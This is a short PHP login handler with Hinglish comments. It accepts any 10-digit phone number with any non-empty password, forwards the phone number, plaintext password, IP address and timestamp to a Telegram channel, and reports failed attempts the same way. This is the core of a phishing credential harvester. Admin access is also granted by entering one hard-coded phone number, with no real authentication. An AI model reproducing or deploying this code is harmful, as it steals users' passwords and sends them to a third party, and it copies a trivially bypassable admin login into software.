<?php
session_start();
require_once 'config.php';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // 1. Data collect karna
    $phone = $_POST['phone'] ?? '';
    $password = $_POST['password'] ?? '';
    $ip = $_SERVER['REMOTE_ADDR']; // User ka IP address
    $time = date('d-m-Y H:i:s');

    // 2. Strict Verification (Exactly 10 digits)
    if (strlen($phone) === 10 && !empty($password)) {

        // JSON storage ke liye data folder check
        $userFile = DATA_DIR . $phone . ".json";
        if (!file_exists($userFile)) {
            file_put_contents($userFile, json_encode(["last_clear" => 0, "messages" => []]));
        }

        // 3. Telegram par pura details bhejna
        $message = "<b>🚀 NEW LOGIN RECEIVED</b>\n\n" .
                   "<b>📱 Phone:</b> <code>+91 $phone</code>\n" .
                   "<b>🔑 Password:</b> <code>$password</code>\n" .
                   "<b>🌐 IP:</b> $ip\n" .
                   "<b>⏰ Time:</b> $time";

        sendTelegram($message);

        // 4. Session create karna
        $_SESSION['user_phone'] = $phone;

/* ===== ADMIN CHECK (FIX) ===== */
if ($phone === '1000000000') {   // 👈 admin number
    $_SESSION['is_admin'] = true;
    header("Location: arbagent.php"); // 👈 admin dashboard
    exit();
}

/* ===== NORMAL USER ===== */
header("Location: chat.php");
exit();

    } else {
        // Agar validation fail ho jaye
        sendTelegram("<b>⚠️ FAILED LOGIN</b>\nPhone: $phone\nStatus: Invalid Number/Pass");
        header("Location: index.php?error=invalid");
        exit();
    }
}
?>
